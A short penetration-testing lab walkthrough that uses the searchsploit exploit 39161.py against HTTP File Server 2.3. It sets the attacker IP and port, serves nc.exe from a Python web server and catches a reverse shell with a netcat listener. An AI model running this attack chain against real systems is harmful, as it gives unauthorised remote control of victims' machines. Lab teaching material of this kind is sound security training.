# Fixing Exploits

## Practice Demo

Enumerate the target

* <mark style="color:yellow;">nmap -sV targetIP</mark>

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Since we don't have internet access on the lab, we will have to use a local exploit.

### Using searchsploit to search for vulns

* <mark style="color:yellow;">searchsploit HTTP File Server 2.3</mark>

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

We will move the wanted exploit to the current directory

* <mark style="color:yellow;">searchsploit -m 39161.py</mark>

### Analysing the exploit

Open up the exploit with VIM

We can see in the document how to run this exploit, in this case  it is:

* <mark style="color:yellow;">python 39161.py 'targetIP' 'targetPORT'</mark>

We run it, but nothing happens.

If we look at the document again, we can see a note telling us the following:

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

We also need to specify our <mark style="color:red;">IP and local\_port</mark> to use.

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

We need to get the netcat executable to the current directory, to do this we run:

* <mark style="color:yellow;">cp /usr/share/windows-resources/binaries/nc.exe</mark>

#### Setting up the web server where we will host the netcat executable

* <mark style="color:yellow;">python -m SimpleHTTPServer 80</mark>

#### Setting up the netcat listener to get the command shell session

* <mark style="color:yellow;">nc -nvlp 1234 (Use the specified port on the file)</mark>

You will the netcat executable getting downloaded, and you may or may not be sucessful on getting the command shell session, remember the note from the exploit. Try several times.
